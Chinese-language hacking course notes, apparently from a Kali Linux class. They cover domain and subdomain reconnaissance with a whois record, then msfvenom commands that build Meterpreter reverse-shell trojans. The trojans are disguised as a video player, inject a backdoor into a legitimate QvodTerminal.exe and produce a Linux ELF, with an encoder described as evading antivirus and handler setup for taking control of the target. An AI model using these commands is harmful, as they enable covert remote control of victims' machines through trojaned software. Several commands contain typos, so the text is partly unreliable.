> ## 查询域名相关信息
>
> 查询ip与域名对应：
>
> ping + 域名
>
> nslookup + 域名
>
> Dig + 域名 、dig+@114.114.114.114 +域名
>
> dig+x+ip ->返回域名
>
> ---
>
> 
>
> ```c
> ─# whois xuegod.cn    查询域名相关信息
> Domain Name: xuegod.cn
> ROID: 20140908s10001s72166376-cn
> Domain Status: ok
> Registrant: 北京跳动未来科技有限公司
> Registrant Contact Email: jianmingbasic@163.com
> Sponsoring Registrar: 阿里云计算有限公司（万网）
> Name Server: dns7.hichina.com
> Name Server: dns8.hichina.com
> Registration Time: 2014-09-08 10:52:31
> Expiration Time: 2022-09-08 10:52:31
> DNSSEC: unsigned
> ```
>
> ## 
>
> ```c
> beianbeian.com  搜企业域名搜索
> 天眼查						备案信息查询
> ```
>
> ----
>
> #### 子域名
>
> 大型网站就有子域名，小型网站一般就一个主域名。
>
> 有的主域名无法直接攻破，可以先攻破子域名。
>
> 子域名挖掘机：maltego工具  得翻墙注册，不然用不了
>
> 子域名查询网站--自己上网搜
>
> ---
>
> # 生成西瓜影音的后门程序
>
> ```c
> ┌──(root💀kali)-[~]
> └─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.110.130  LPORT=4444 -b "\0x00" -e x86/shikate_ga_nai -i 10 -f exe -o /var/www/html/西瓜影音1.exe
> 
> [-] Skipping invalid encoder x86/shikate_ga_nai
> [!] Couldn't find encoder to use
> No encoder specified, outputting raw payload
> Payload size: 354 bytes
> Final size of exe file: 73802 bytes
> Saved as: /var/www/html/西瓜影音1.exe
>   
> msfvenom：工具
> -a x86：指定架构  32位
> --platform wondows：平台
> -p windows/meterpreter/reverse_tcp：比shell强大很多,payload
> 目标主机执行木马程序后会与lhost主机的lport端口相连接
> -b '\x00':去掉16进制的坏字符
> -e x86/shikate_ga_nai：编码器 免杀，逃避防护软件
> -i 10：编码次数
> -f exe：制定文件格式
> -o /var/www/html/西瓜影音1.exe：输出位置与命名
> ```
>
> -----
>
> 生成的exe木马程序在目标机运行后
>
> 我们在kali主机可以监控目标机的所有操作，可以看到目标机的界面。
>
> ```c
> 输入 msfconsole：进入msf命令行模式
> msfdb run:运行mfs
> use expolit/multi/handler  这句执行完
> set payload windows/meterpreter/reverse_tcp  设置payload
> show option:查看主机的ip+port
> set LHOST 当前kali的ip
> set lport 4444
> exploit：进入攻击模式
> run:开始监听---目标机程序一旦运行这里就建立链接了。
> meterpreter>：最终到达这个界面就可以操控目标机器了。
> ```
>
> ----
>
> ## 如何给一个正常的软件植入后门--这才是厉害的木马
>
> 植入后门：给正常的qq.exe植入后门后还叫qq.exe并且可以正常安装，功能也可以正常使用。但是加入后门之后，这个qq所在的目标机就会被主机监控。
>
> ```c
> ┌──(root💀kali)-[~]
> └─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.110.130  LPORT=4444 -b "\0x00" -e x86/shikate_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe
>   
> 给快播的子程序植入木马。多了个-x xxx.exe。当前路径必须是xxx.exe所在的路径，这样就可以直接生成新的带木马的exe。
> 
> 
> 
> ```

## 如何给linux生成木马

```c
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.110.130  LPORT=4444 -b "\0x00" -i 10 -f elf -o /var/www/html/xuegod
linux下面生成的文件格式elf格式。
```

备注：x86表示32bit操作系统，x64表示64位，x86_64也是64位。

```c
在主机执行：
set payload linux/x64/meterpreter/reveser_tcp 回车
```

